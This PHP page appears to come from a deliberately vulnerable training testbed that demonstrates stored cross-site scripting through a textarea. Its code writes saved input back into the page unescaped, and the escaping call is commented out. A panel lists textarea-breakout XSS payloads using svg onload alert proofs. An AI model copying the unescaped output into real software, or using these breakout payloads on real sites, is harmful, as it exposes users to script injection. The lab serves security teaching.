<?php
// File where we store the text
$dataFile = __DIR__ . '/data.txt';

// Default content
$savedText = "";

$payload_templates = [
    [
        'title' => 'Try a basic XSS payload',
        'note'  => "\nInsert the following payload and click save\n\nObserve that appears to be handled safely",
        'text'  => "<svg onload=alert(1)>",
    ],
    [
        'title' => 'Try a closing textarea tag with a string before and after',
        'note'  => "\nObserve that the textarea element breaks and b33f is no longer contained",
        'text'  => "d34d</textarea>b33f",
    ],
    [
        'title' => 'Combine the closing text area element with an XSS PoC',
        'note'  => "\nObserve that the input is not handled safely and that arbitrary JavaScript is executed\n\nRight click below the text element and click inspect\n\nObserve your embeded HTML ",
        'text'  => "</textarea><svg onload=alert(1)>",
    ],

];

// HTML escaping helper used by your template rendering
function h(string $s): string {
    return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
}

// Load existing data
if (file_exists($dataFile)) {
    $savedText = file_get_contents($dataFile);
}

// Handle submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    if (isset($_POST['user_text'])) {

        $input = $_POST['user_text'];

        // Save to file
        file_put_contents($dataFile, $input);

        // Update displayed value
        $savedText = $input;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Text Storage App</title>
 <link rel="stylesheet" href="/shared/css/theme.css">
<link rel="stylesheet" href="/shared/css/header.css">
</head>

<body>
<div class="page-wrap">

  <a href="/" class="ctb-home">
    <div class="ctb-header headerpanel" role="banner">
      <div class="ctb-inner">
        <img class="ctb-shield" src="/shared/images/shield.png" alt="" aria-hidden="true" />
        <div class="ctb-text">
          <div class="ctb-title">
            <div class="crevice">CREVICE</div>
            <div class="testbed">TESTBED</div>
          </div>
        </div>
        <div class="ctb-tag">Exploit WebApp Vulnerabilities</div>
      </div>
    </div>
  </a>

 <div class="layout-row">
<div class="app-container panel">

  <div class="header-row">
    <h2>TextArea Stored Cross-Site Scripting</h2>
  </div>

  <form method="POST">

    <div class="input-panel">

      <label for="user_text">User input</label>

      <textarea
        name="user_text"
        id="user_text"
        placeholder="Type your text here..."
      ><?php
        //  echo htmlspecialchars($savedText, ENT_QUOTES, 'UTF-8');
		    echo $savedText;
      ?></textarea>
<br>
      <button type="submit">Save</button>

    </div>

  </form>

</div>

   <!-- Example payloads panel -->
    <div class="payloads-container panel">
      <div class="header-row">
        <h2>Example Payloads</h2>
        <button type="button" id="toggleAllPayloads">Show all</button>
      </div>

      <div class="input-panel" style="margin-bottom:0;">
        <?php foreach ($payload_templates as $idx => $p): ?>
          <div class="payload-block">
            <div class="payload-body" id="payload-<?php echo (int)$idx; ?>">
              <p class="note">
                <strong><?php echo h($p['title']); ?>:</strong>
                <?php echo nl2br(h($p['note'])); ?>
              </p>
              <pre><?php echo h($p['text']); ?></pre>
            </div>
          </div>
        <?php endforeach; ?>
      </div>
    </div>

  <div class="text-container">
    <div class="input-panel textborder">
Demonstration of user input unsafely passed to a textarea leading to XSS that automated scanners sometimes miss.
    </div></div>
	</div>
  <br>
  <a class="whitetext" href="/">Home</a></div>
</div>
<script src="/shared/scripts/payloadsButton.js"></script>
</body>
</html>
